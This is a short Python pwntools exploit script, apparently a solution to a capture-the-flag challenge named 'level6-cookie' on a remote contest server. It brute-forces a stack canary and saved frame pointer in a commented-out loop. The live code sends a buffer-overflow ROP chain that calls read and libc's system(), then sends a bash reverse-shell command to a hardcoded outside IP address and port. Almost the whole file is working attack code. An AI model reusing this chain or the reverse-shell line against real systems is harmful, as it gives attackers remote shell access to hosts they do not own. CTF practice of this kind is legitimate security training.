#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 ctf <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level="debug"

#r=remote("pwn.sixstars.team",22006)
elf=ELF("./level6-cookie")
libc=ELF("./libc-2.23.so")

canary=p32(0x80805400)             #00 54 80 80
rbp=p32(0xffddd808)
libc.address=0xf7601000
"""
for j in range(4):
    for i in range(256):
        if i==10:
            continue
        r=remote("pwn.sixstars.team",22006)
        sh='a'*0x40+canary+'a'*0x8+rbp+chr(i)
        try:
            r.recv()
            r.sendline(sh)
            r.recv()
            r.close()
        except:
            continue
        else:
            rbp=rbp+chr(i)
            r.close()
            break
"""
r=remote("pwn.sixstars.team",22006)

bss=p32(0x804b000)
syms=libc.sym["system"]
pop3=p32(0x08048fb9)
write=p32(0x08048CC3)
read=p32(0x8048BB7)

sh='a'*0x40+canary+'a'*0x8+rbp+read+pop3+p32(4)+bss+p32(53)+p32(syms)+p32(0)+bss

r.recv()
r.sendline(sh)
r.send('bash -c "bash -i >& /dev/tcp/138.68.0.234/1234 0>&1"')

r.interactive()
